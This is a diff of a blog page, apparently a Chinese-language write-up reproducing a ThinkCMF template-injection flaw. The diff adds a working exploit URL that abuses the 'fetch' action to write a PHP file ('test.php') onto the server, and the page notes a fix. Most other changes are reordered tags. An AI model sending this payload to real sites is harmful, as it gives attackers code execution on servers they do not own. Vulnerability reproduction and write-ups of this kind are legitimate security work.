@@ -25,7 +25,7 @@
 <meta property="og:image" content="https://i.loli.net/2019/11/18/gNmQX7Mr5f1WhDV.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/18/ntyIzMOWHiqbJLF.png">
 <meta property="og:image" content="https://i.loli.net/2019/11/18/zTE9yUWfnu8Roke.png">
-<meta property="og:updated_time" content="2019-11-18T10:54:19.885Z">
+<meta property="og:updated_time" content="2019-11-18T14:42:58.794Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ThinkCMF框架任意内容包含漏洞复现">
 <meta name="twitter:image" content="https://i.loli.net/2019/11/18/U43C8LihrXJ1PK2.png">
@@ -228,7 +228,11 @@
 <blockquote>
 <p><code>fetch函数</code>的作用是获取页面内容，调用内置模板引擎<code>fetch</code>方法，thinkphp的模版引擎使用的是<code>smarty</code>，在<code>smarty</code>中当<code>key和value</code>可控时便可以形成模板注入。 </p>
 </blockquote>
-<p><strong>这里主要是smarty模板注入，明天有时间复现一下</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ThinkCMFX/?a=fetch&amp;templateFile=public/index&amp;prefix=%27%27&amp;content=%3Cphp%3Efile_put_contents(%27test.php%27,%27%3C?php%20phpinfo();%20?%3E%27)%3C/php%3E</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=fetch&amp;templateFile=public/index&amp;prefix=&apos;&apos;&amp;content=&lt;php&gt;file_put_contents(&apos;test.php&apos;,&apos;&lt;?php phpinfo(); ?&gt;&apos;)&lt;/php&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里主要是smarty模板注入。。</strong></p>
 <h4 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h4><blockquote>
 <p>将 <code>HomebaseController.class.php</code> 和 <code>AdminbaseController.class.php</code> 类中 <code>display</code> 和<code>fetch</code> 函数的修饰符改为 <code>protected</code></p>
 </blockquote>
@@ -509,10 +513,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
@@ -525,6 +525,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
@@ -533,11 +537,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
+                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
+                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -565,11 +569,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">phpcms</a>
+                <a href="javascript:void(0)" class="js-tag color5">漏洞挖掘</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞挖掘</a>
+                <a href="javascript:void(0)" class="js-tag color2">phpcms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -589,11 +593,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
+                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
+                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
               </li>
              
               <li class="article-tag-list-item">
